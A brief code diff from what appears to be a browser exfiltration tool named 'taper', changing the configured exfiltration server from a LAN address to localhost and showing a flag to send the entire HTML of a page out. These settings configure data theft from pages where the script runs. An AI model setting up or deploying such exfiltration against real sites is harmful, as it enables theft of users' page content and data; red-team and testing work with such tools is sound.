@@ -33,7 +33,7 @@ function initGlobals()
 
 
 	// Exfil server
-	window.taperexfilServer = "https://192.168.2.61:8444";
+	window.taperexfilServer = "https://127.0.0.1:8444";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
